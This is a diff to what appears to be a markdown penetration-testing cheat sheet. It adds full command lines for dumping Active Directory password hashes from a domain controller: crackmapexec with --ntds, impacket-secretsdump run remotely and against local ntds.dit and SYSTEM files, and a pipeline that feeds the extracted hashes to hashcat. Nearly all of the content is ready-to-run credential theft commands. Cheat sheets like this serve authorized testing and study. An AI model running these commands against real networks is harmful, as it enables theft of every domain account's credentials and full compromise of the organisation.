@@ -128,6 +128,7 @@ crackmapexec smb IP_ADDRESS/MASK -u 'USERNAME' -k --use-kcache
 ```
 
 ## NTDS Exfiltration
+### Remote extraction using CrackmapExec or Impacket
 Once you get domain admin, dump NTDS.dit to get all the hashes from the Active Directory :
 ```bash
 crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -p 'PASSWORD' --ntds
@@ -136,7 +137,22 @@ Use with -H option to use NTLM hash :
 ```bash
 crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -H 'NTLM_HASH' --ntds
 ```
+You can also use Impacket to extract NTDS from the DC :
+```bash
+impacket-secretsdump domain.local/username@FQDN -k -no-pass
+```
 Then, extract all the hashes to put them on hashcat.
 ```bash
 cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
+```
+
+### Extract NTDS from a local NTDS.dit file
+If you get a local access to the DC, you have to get NTDS.dit and SYSTEM files in order to extract all the informations. These files are located here :
+```powershell
+%SYSTEMROOT%\NTDS\ntds.dit
+%SystemRoot%\System32\config\SYSTEM
+```
+Once you get these two files, you are able to extract all the informations using impacket. The 'LOCAL' at the end allows you to use local ntds file :
+```bash
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
